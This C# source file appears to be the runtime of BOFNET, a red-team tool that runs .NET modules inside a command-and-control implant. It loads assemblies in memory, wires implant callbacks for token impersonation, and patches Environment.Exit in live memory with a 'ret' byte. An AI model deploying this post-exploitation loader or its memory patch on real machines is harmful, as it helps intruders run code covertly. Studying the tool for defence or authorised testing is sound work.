using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace BOFNET {
    public class Runtime {

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate MarshalByRefObject InitialiseChildBOFNETAppDomain([MarshalAs(UnmanagedType.LPWStr)] string appDomainName, [MarshalAs(UnmanagedType.LPArray)] byte[] data, int len);

        public class AssemblyInfo {
            public byte[] AssemblyData;
            public Assembly Assembly;
        }

        public static Dictionary<string, AssemblyInfo> LoadedAssemblies { get; private set; } = new Dictionary<string, AssemblyInfo>();

        public static Dictionary<int, BeaconJob> Jobs { get; private set; } = new Dictionary<int, BeaconJob>();

        static bool firstInit = true;

        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        public enum AllocationProtect : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        [DllImport("shell32.dll", SetLastError = true)]
        static extern IntPtr CommandLineToArgvW(
            [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
            UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress,
            out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

        private static Type FindType(string name) {

            //Try to get based on fully qualified name first
            Type type = Type.GetType(name);
            if(type != null) {
                return type;
            }

            //Coulnd't find it, so lets search all assemblies
            var results = AppDomain.CurrentDomain.GetAssemblies()
               .SelectMany(s => s.GetTypes())
               .Where(p => p.Name == name || p.FullName == name);
 
            if (results.Count() > 1) {
                throw new AmbiguousMatchException();
            }

            return results.FirstOrDefault();
        }

        public static string[] CommandLineToArgs(string commandLine) {
            int argc;
            var argv = CommandLineToArgvW(commandLine, out argc);
            if (argv == IntPtr.Zero)
                throw new System.ComponentModel.Win32Exception();
            try {
                var args = new string[argc];
                for (var i = 0; i < args.Length; i++) {
                    var p = Marshal.ReadIntPtr(argv, i * IntPtr.Size);
                    args[i] = Marshal.PtrToStringUni(p);
                }

                return args;
            } finally {
                Marshal.FreeHGlobal(argv);
            }
        }

        public static Assembly LoadAssembly(byte[] assemblyData) {
            Assembly assembly = AppDomain.CurrentDomain.Load(assemblyData);
            AssemblyName assemblyName = new AssemblyName(assembly.FullName);
            AssemblyInfo ai = new AssemblyInfo {
                AssemblyData = assemblyData,
                Assembly = assembly
            };

            LoadedAssemblies[assemblyName.Name] = ai;
            return assembly;
        }

        public static BeaconObject CreateBeaconObject(string bofName, BeaconOutputWriter bow, InitialiseChildBOFNETAppDomain initialiseChildBOFNETAppDomain, BeaconUseToken beaconUseToken, BeaconRevertToken beaconRevertToken, BeaconCallbackWriter beaconCallbackWriter) {

            Type bofType = FindType(bofName);

            if (bofType == null) {
                throw new TypeLoadException($"[!] Failed to find type {bofName} within BOFNET AppDomain, have you loaded the containing assembly yet?");
            }

            BeaconObject bo = (BeaconObject)Activator.CreateInstance(bofType, new object[] { new DefaultBeaconApi(bow, initialiseChildBOFNETAppDomain, beaconUseToken, beaconRevertToken, beaconCallbackWriter) });
            return bo;
        }

        public static void RegisterRuntimeAssembly(byte[] assemblyData) {
            Runtime.AssemblyInfo ai = new Runtime.AssemblyInfo {
                Assembly = Assembly.GetExecutingAssembly(),
                AssemblyData = assemblyData
            };
            Runtime.LoadedAssemblies["BOFNET"] = ai;
        }

        public static void SetupAssemblyResolver() {
            Debug.WriteLine($"Running resolver from {AppDomain.CurrentDomain.FriendlyName}");
            if (firstInit) {
                AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;
                firstInit = false;
            }
        }

        public static void InvokeBof(long[] beaconApis, string bofName, object args) {

            SetupAssemblyResolver();

            var beaconConsole = (BeaconCallbackWriter)Marshal.GetDelegateForFunctionPointer((IntPtr)(beaconApis[0]),
                                                                                                       typeof(BeaconCallbackWriter));
            var initialiseChildBOFNETAppDomain = (InitialiseChildBOFNETAppDomain)Marshal.GetDelegateForFunctionPointer((IntPtr)(beaconApis[1]),
                                                                                                      typeof(InitialiseChildBOFNETAppDomain));

            var beaconUseToken = (BeaconUseToken)Marshal.GetDelegateForFunctionPointer((IntPtr)(beaconApis[2]), typeof(BeaconUseToken));
            var beaconRevertToken = (BeaconRevertToken)Marshal.GetDelegateForFunctionPointer((IntPtr)(beaconApis[3]), typeof(BeaconRevertToken));

            using (BeaconConsoleWriter bcw = new BeaconConsoleWriter(beaconConsole)) {

                if (String.IsNullOrEmpty(bofName)) {
                    bcw.WriteLine($"[!] BOF name not supplied, don't know what to execute, bailing!");
                    return;
                }

                try {

                    BeaconObject bo = CreateBeaconObject(bofName, bcw,initialiseChildBOFNETAppDomain, beaconUseToken, beaconRevertToken, beaconConsole);

                    if (args is string cmdLine) {
                        if (!string.IsNullOrEmpty(cmdLine))
                            bo.Go(CommandLineToArgs(cmdLine));
                        else
                            bo.Go(new string[] { });
                    } else if (args is byte[] raw) {
                        bo.Go(raw);
                    } else {
                        bcw.WriteLine($"[!] Unuspported argument type {args.GetType().FullName} when attempting to invoke BOF");
                    }

                } catch (TypeLoadException tle) {

                    bcw.WriteLine(tle.Message);

                } catch (AmbiguousMatchException) {

                    bcw.WriteLine($"[!] Multiple BOFs found with name {bofName}, use fully qualifed type including namespace");
                    return;

                } catch (ReflectionTypeLoadException rtle) {

                    bcw.WriteLine($"[!] Failed to load a type during BOFNET execution with the folowing loader exceptions:");
                    foreach (Exception e in rtle.LoaderExceptions) {
                        bcw.WriteLine($"{e}");
                    }
                    return;

                } catch (Exception e) {

                    bcw.WriteLine($"[!] BOFNET executed but threw an unhandled exception: {e}");

                }
            }
        }

        public static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args) {

            AssemblyName assemblyName = new AssemblyName(args.Name);
            if (LoadedAssemblies.ContainsKey(assemblyName.Name)) {
                return LoadedAssemblies[assemblyName.Name].Assembly;
            } else {
                return null;
            }
        }

        public static bool PatchEnvironmentExit()
        {
            // Credit MDSec: https://www.mdsec.co.uk/2020/08/massaging-your-clr-preventing-environment-exit-in-in-process-net-assemblies/
            var methods = new List<MethodInfo>(typeof(Environment).GetMethods(BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic));
            var exitMethod = methods.Find((MethodInfo mi) => mi.Name == "Exit");
            RuntimeHelpers.PrepareMethod(exitMethod.MethodHandle);
            var exitMethodPtr = exitMethod.MethodHandle.GetFunctionPointer();
            unsafe
            {
                IntPtr target = exitMethod.MethodHandle.GetFunctionPointer();
                MEMORY_BASIC_INFORMATION mbi;
                if (VirtualQueryEx((IntPtr)(-1), target, out mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != 0)
                {
                    if (mbi.Protect == (uint)AllocationProtect.PAGE_EXECUTE_READ)
                    {
                        uint flOldProtect;
                        if (VirtualProtectEx((IntPtr)(-1), (IntPtr)target, (UIntPtr)1, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out flOldProtect))
                        {
                            *(byte*)target = 0xc3; // ret
                            VirtualProtectEx((IntPtr)(-1), (IntPtr)target, (UIntPtr)1, flOldProtect, out flOldProtect);
                            return true;
                        }
                    }
                }
            }
            return false;
        }
    }
}
